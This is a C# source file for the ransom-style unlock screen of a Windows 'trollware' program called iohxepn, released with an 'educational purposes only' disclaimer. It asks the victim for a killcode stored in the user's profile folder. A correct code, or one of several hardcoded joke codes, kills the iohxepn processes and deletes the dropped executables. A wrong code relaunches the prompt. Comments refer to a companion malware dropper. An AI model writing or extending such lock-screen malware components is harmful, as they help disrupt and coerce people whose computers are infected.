/* As per usual:
 * 
 * iohxepn and all parts of it are for educational purposes only.
 * dont use this as malware, you can go to prison.
 * i am not responsible for your use of this software.
 * 
 * (C) 2020 anonfoxer */




using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace iohxepnPay
{
    public partial class Form1 : Form
    {
        //same launch vars as the malware dropper
        //current user of windows
        string userName = Environment.UserName;
        //name of the computer
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        //it writes killcode to this file in pc
        string pcPassword = "\\killcode.txt";

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("iohxepn trollware: written by anonfoxer. gateway to disable virus!");
            MessageBox.Show("Please note the original version ofthe virus has THIS message to let you know that you do not need to pay bitcoin!! You are just to find the killcode and enter it here!");
        }

        private void cleanup()
        {
            #region CLEANUP
            try
            {
                foreach (var proc in Process.GetProcessesByName("iohxepnLoadDist"))
                {
                    proc.Kill();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            try
            {
                foreach (var proc in Process.GetProcessesByName("iohxepn"))
                {
                    proc.Kill();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            try
            {
                foreach (var proc in Process.GetProcessesByName("iohxepnPay"))
                {
                    proc.Kill();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            try
            {
                string path = "\\iohxepn.exe";
                string fullpath = userDir + userName + path;
                File.Delete(fullpath);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            try
            {
                string path = "\\iohxepnPay.exe";
                string fullpath = userDir + userName + path;
                File.Delete(fullpath);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            try
            {
                string path = "\\iohxepnLoadDist.exe";
                string fullpath = userDir + userName + path;
                File.Delete(fullpath);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            #endregion
        }

        private void killCodeSubmit_Click(object sender, EventArgs e)
        {
            string pcPath = userDir + userName + pcPassword;
            string code = File.ReadAllText(pcPath);

            if (killCodeInput.Text == code || killCodeInput.Text == "butts" || killCodeInput.Text == "vore!" || killCodeInput.Text == "e621.net")
            {
                cleanup();
                MessageBox.Show("Correct code entered! Your PC will now be cleaned of iohxepn! Hope you enjoyed the fun! <3");
                System.Windows.Forms.Application.Exit();
            }
            else
            {
                MessageBox.Show("Incorrect code! Try again!");
                System.Diagnostics.Process.Start("iohxepnPay.exe");
            }
        }
    }
}
